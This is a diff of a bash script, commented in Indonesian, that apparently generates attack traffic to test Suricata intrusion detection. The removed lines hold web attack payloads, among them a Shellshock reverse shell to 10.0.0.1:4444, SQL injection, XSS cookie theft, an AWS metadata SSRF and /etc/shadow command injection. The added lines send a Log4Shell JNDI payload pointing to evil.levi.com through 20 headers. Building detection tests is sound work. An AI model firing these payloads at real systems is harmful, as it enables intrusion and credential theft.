@@ -92,97 +92,52 @@ run_attack() {
     sleep "$DELAY"
 }
 
-# IP 50 — SQL Injection Klasik
-run_attack "${IP_BASE}.50" "SQL Injection (UNION)" \
-    "${TARGET}/login?user=admin'+UNION+SELECT+1,2,3--"
+# ── Daftar header Log4Shell yang berbeda-beda ─────────────────────────────────
+# Suricata mendeteksi pola ${jndi: di berbagai header HTTP
+HEADERS=(
+    "X-Api-Version"
+    "User-Agent"
+    "X-Forwarded-For"
+    "Referer"
+    "X-Client-IP"
+    "X-Real-IP"
+    "Accept-Language"
+    "Authorization"
+    "X-Originating-IP"
+    "X-Remote-IP"
+    "X-Remote-Addr"
+    "CF-Connecting-IP"
+    "True-Client-IP"
+    "X-Cluster-Client-IP"
+    "Forwarded"
+    "X-Forwarded-Host"
+    "X-Host"
+    "X-Original-URL"
+    "X-Wap-Profile"
+    "Contact"
+)
 
-# IP 51 — Shellshock (CVE-2014-6271)
-run_attack "${IP_BASE}.51" "Shellshock via User-Agent" \
-    "${TARGET}/" \
-    "-H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'"
+PAYLOAD="\${jndi:ldap://evil.levi.com/exploit}"
 
-# IP 52 — Log4Shell (CVE-2021-44228)
-run_attack "${IP_BASE}.52" "Log4Shell via Header" \
-    "${TARGET}/" \
-    "-H 'X-Api-Version: \${jndi:ldap://evil.levi.com/exploit}'"
+echo ""
+info "Menggunakan serangan Log4Shell (CVE-2021-44228)"
+info "Payload dikirim via 20 header HTTP berbeda dari 20 IP berbeda"
+echo ""
 
-# IP 53 — Path Traversal (LFI)
-run_attack "${IP_BASE}.53" "Path Traversal /etc/passwd" \
-    "${TARGET}/../../../../etc/passwd"
+for idx in "${!HEADERS[@]}"; do
+    SRC_IP="${IP_BASE}.$((IP_START + idx))"
+    HDR="${HEADERS[$idx]}"
 
-# IP 54 — XSS Reflected
-run_attack "${IP_BASE}.54" "Cross-Site Scripting (XSS)" \
-    "${TARGET}/search?q=<script>alert(document.cookie)</script>"
+    attack "Log4Shell [${HDR}] dari ${BOLD}${SRC_IP}${NC}"
+    curl -s --max-time 3 \
+        --interface "$SRC_IP" \
+        -H "${HDR}: ${PAYLOAD}" \
+        "${TARGET}/" \
+        -o /dev/null 2>/dev/null
 
-# IP 55 — PHP RCE via CGI
-run_attack "${IP_BASE}.55" "PHP CGI Remote Code Execution" \
-    "${TARGET}/?-d+allow_url_include=1+-d+auto_prepend_file=php://input"
+    sleep "$DELAY"
+done
 
-# IP 56 — Nikto Scanner
-run_attack "${IP_BASE}.56" "Nikto Web Scanner" \
-    "${TARGET}/" \
-    "-A 'Nikto/2.1.6'"
-
-# IP 57 — ZmEu Bot (phpMyAdmin Scanner)
-run_attack "${IP_BASE}.57" "ZmEu Bot (phpMyAdmin)" \
-    "${TARGET}/phpMyAdmin/index.php" \
-    "-A 'ZmEu'"
-
-# IP 58 — Blackmoon Botnet
-run_attack "${IP_BASE}.58" "Blackmoon Botnet C2" \
-    "${TARGET}/" \
-    "-A 'blackmoon'"
-
-# IP 59 — GPON Router Exploit
-run_attack "${IP_BASE}.59" "GPON Router Exploit" \
-    "${TARGET}/GponForm/diag_Form?images/"
-
-# IP 60 — Apache Struts (CVE-2017-5638 / Equifax)
-run_attack "${IP_BASE}.60" "Apache Struts RCE (Equifax)" \
-    "${TARGET}/" \
-    "-H 'Content-Type: %{(#_=\\'multipart/form-data\\').}'"
-
-# IP 61 — Jboss/Java Deserialization
-run_attack "${IP_BASE}.61" "JBoss Invoker Scan" \
-    "${TARGET}/invoker/readonly"
-
-# IP 62 — WordPress xmlrpc brute
-run_attack "${IP_BASE}.62" "WordPress xmlrpc Exploit" \
-    "${TARGET}/xmlrpc.php" \
-    "-X POST -d '<?xml version=\"1.0\"?><methodCall><methodName>wp.getUsersBlogs</methodName></methodCall>'"
-
-# IP 63 — AWS Metadata Steal (SSRF)
-run_attack "${IP_BASE}.63" "SSRF (AWS Metadata)" \
-    "${TARGET}/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
-
-# IP 64 — Spring4Shell (CVE-2022-22965)
-run_attack "${IP_BASE}.64" "Spring4Shell RCE" \
-    "${TARGET}/" \
-    "-H 'suffix: %>//'"
-
-# IP 65 — SQL Injection via Cookie
-run_attack "${IP_BASE}.65" "SQL Injection via Cookie" \
-    "${TARGET}/" \
-    "-H 'Cookie: session=1\\'OR\\'1\\'=\\'1'"
-
-# IP 66 — Command Injection
-run_attack "${IP_BASE}.66" "Command Injection" \
-    "${TARGET}/?cmd=cat+/etc/shadow;id;whoami"
-
-# IP 67 — Heartbleed (TLS scanner signature)
-run_attack "${IP_BASE}.67" "Heartbleed Scanner" \
-    "${TARGET}/" \
-    "-A 'OpenSSL-Scanner/1.0 (Heartbleed-Test)'"
-
-# IP 68 — Hydra/Brute force HTTP Auth
-run_attack "${IP_BASE}.68" "HTTP Auth Brute Force (Hydra-style)" \
-    "${TARGET}/admin" \
-    "-u 'admin:password123'"
-
-# IP 69 — DirBuster Scanner
-run_attack "${IP_BASE}.69" "DirBuster Directory Scan" \
-    "${TARGET}/admin/config.php" \
-    "-A 'DirBuster-1.0-RC1'"
 
 # ── Ringkasan ─────────────────────────────────────────────────────────────────
 header "✅ Simulasi Selesai!"
